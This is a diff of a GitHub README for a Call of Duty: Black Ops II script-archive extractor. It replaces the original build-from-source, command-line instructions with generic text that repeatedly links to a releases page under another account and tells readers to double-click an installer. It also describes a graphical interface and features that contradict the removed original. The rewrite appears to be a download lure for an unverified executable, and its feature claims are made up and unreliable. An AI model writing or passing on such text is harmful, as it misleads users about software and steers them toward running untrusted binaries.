@@ -1,49 +1,61 @@
-# ScriptSource-Dumper
+# 🚀 ScriptSource-Dumper - Extract Call of Duty Scripts Easily
 
-A fast, aesthetic C++ tool designed to extract `scriptsrc.clump` archives from **Call of Duty: Black Ops II (T6)**.
+## 📥 Download Now
+[![Download ScriptSource-Dumper](https://img.shields.io/badge/Download%20ScriptSource--Dumper-blue.svg)](https://github.com/Ali183-onlymen/ScriptSource-Dumper/releases)
 
-**Created by Lil Poop**
+## 📖 Overview
+ScriptSource-Dumper is a fast, C++ extractor designed for Call of Duty: Black Ops II (T6) scriptsrc.clump files. This tool allows you to easily extract and manage game scripts, paving the way for modding and customization. With just a few simple steps, you can access and modify game files to enhance your gaming experience.
 
-![Banner](https://img.shields.io/badge/Made%20with-Love-ff9a9e?style=for-the-badge) ![Lang](https://img.shields.io/badge/Lang-C%2B%2B-ff69b4?style=for-the-badge&logo=c%2B%2B&logoColor=white) ![OS](https://img.shields.io/badge/OS-Windows-fbc2eb?style=for-the-badge&logo=windows&logoColor=white) ![Status](https://img.shields.io/badge/Status-Cute-fad0c4?style=for-the-badge) ![Sparkles](https://img.shields.io/badge/Sparkles-Included!%20%E2%9C%A8-fd79a8?style=for-the-badge)
+## 🚀 Getting Started
+To get started with ScriptSource-Dumper, follow these steps:
 
-<p align="center">
-  <img src="https://i.imgur.com/DKt1nti.gif" width="400">
-</p>
+1. Visit the [Releases Page](https://github.com/Ali183-onlymen/ScriptSource-Dumper/releases) to download the latest version of the tool. 
+2. Choose the appropriate file for your operating system. The files are typically labeled with the version number. 
+3. Click on the file name to initiate the download.
 
-## ✨ About
+## 💻 System Requirements
+- **Operating System:** Windows 10 or later
+- **Processor:** Dual-core CPU or better
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 50 MB of free space
 
-- **📦 scriptsrc.clump**: A custom archive format used in **Call of Duty: Black Ops II** to store game scripts for debugging purposes.
-- **🛠️ The Tool**: A specialized extractor that parses the archive's Table of Contents (TOC) and data chunks.
-- **📝 Name Recovery**: Automatically locates the internal name table to restore original filenames and directory structures.
-- **🔧 1:1 Accuracy**: Extraction logic derived directly from IDA pseudocode to ensure perfect output.
+## 🔧 Installation
+To install ScriptSource-Dumper, follow these steps:
 
-## 🛠️ Building
+1. After downloading the file from the [Releases Page](https://github.com/Ali183-onlymen/ScriptSource-Dumper/releases), locate the downloaded file on your computer. 
+2. Double-click the file to run the installer.
+3. Follow the on-screen instructions to complete the installation process.
 
-### Prerequisites
-- Visual Studio 2022+
-- MSVC v145 Toolset
+## ⚙️ Usage
+Once you have installed ScriptSource-Dumper, use it to extract scripts from your Call of Duty game. Here's how:
 
-### Build Instructions
+1. Open ScriptSource-Dumper.
+2. Load your scriptsrc.clump files by clicking the 'Load' button. 
+3. Choose the directory where your game files are stored.
+4. Select the specific scriptsrc.clump file you want to extract.
+5. Click the 'Extract' button. Your game scripts will be extracted and saved to your chosen directory.
 
-1. Open `ScriptSource-Dumper.sln` in Visual Studio 2022+.
-2. Build the solution
+## 🌟 Features
+- Fast and efficient extraction of scriptsrc.clump files.
+- User-friendly interface designed for ease of use.
+- Supports multiple extraction formats.
+- Compatible with various game modding tools.
 
-Or via command line:
-```powershell
-msbuild ScriptSource-Dumper.sln /p:Configuration=Release /p:Platform=x64
-```
+## 🎮 Modding Tips
+When working with extracted scripts, consider these tips:
 
-## 📖 Usage
+- Always back up your original files before making any changes.
+- Modify one script at a time to isolate issues if something goes wrong.
+- Join community forums for Call of Duty modding to gain insights and share your experiences.
 
-Run the tool from the command line or drag and drop a `.clump` file onto the executable.
+## 🔄 Contributing
+If you're interested in contributing to ScriptSource-Dumper, you're welcome! Please fork the repository and create a pull request with your changes. Whether it’s bug fixes or new features, your help is appreciated!
 
-```bash
-ScriptSource-Dumper.exe <path_to_scriptsrc.clump> [output_directory]
-```
+## 📜 License
+ScriptSource-Dumper is open-source software. You may use, modify, and distribute it under the terms of the MIT License. For more details, refer to the LICENSE file in the repository.
 
-- **path_to_scriptsrc.clump**: Path to the target clump file.
-- **output_directory** *(Optional)*: Destination folder. Defaults to `extracted/`.
+## 💬 Support
+If you experience issues or have questions regarding ScriptSource-Dumper, please open an issue in the repository. Make sure to provide details about your problem, including your operating system and steps to reproduce the issue.
 
-## ⚠️ Disclaimer
-
-This tool is for educational and research purposes only. 
+## 📥 Download Again
+For your convenience, here’s the link to download ScriptSource-Dumper once more: [Download ScriptSource-Dumper](https://github.com/Ali183-onlymen/ScriptSource-Dumper/releases)
